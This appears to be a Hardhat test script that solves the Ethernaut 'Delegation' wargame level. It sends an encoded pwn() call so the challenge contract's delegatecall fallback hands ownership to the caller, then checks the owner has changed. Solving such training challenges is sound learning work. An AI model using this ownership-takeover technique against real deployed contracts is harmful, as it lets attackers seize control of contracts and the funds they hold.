import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("Delegation", function () {

    async function deployTokenFixture(): Promise<any> {
        accounts = await ethers.getSigners();
        [eoa] = accounts;
        const challengeFactory = await ethers.getContractFactory(`Delegation`);
        const challengeAddress = await createChallenge(
            `0xF781b45d11A37c51aabBa1197B61e6397aDf1f78`
        );
        challenge = await challengeFactory.attach(challengeAddress);

        return { eoa, challenge };
    }

    it("solves the challenge", async function () {
        const { eoa, challenge } = await loadFixture(deployTokenFixture);


        let ABI = ["function pwn()"];
        let iface = new ethers.utils.Interface(ABI);
        const data = iface.encodeFunctionData("pwn()");

        console.log("eoa address: " + await eoa.getAddress());
        console.log("challenge address: " + challenge.address);
        console.log("challenge owner: " + await challenge.owner());
        try {
            tx = await eoa.sendTransaction({
                from: await eoa.getAddress(),
                to: challenge.address,
                data: data,
                gasLimit: BigNumber.from(`100000`),
            });
            // console.log({tx});

            const receipt = await tx.wait();
            // console.log({receipt});
        } catch (err) {
            console.log("error: " + err);
        }

        console.log("challenge owner: " + await challenge.owner());

        expect(await challenge.owner()).to.equals(await eoa.getAddress(), "level not solved");

        // Why eoa.call can not be used here?
        // tx = await eoa.call({
        //     from: await eoa.getAddress(),
        //     to : challenge.address,
        //     data : data
        // });
        // Answer: I think call is for read-only function, and sendTransaction is for write function.

    });

    after(async () => {
        expect(await submitLevel(challenge.address), "level not solved").to.be.true;
    });
});
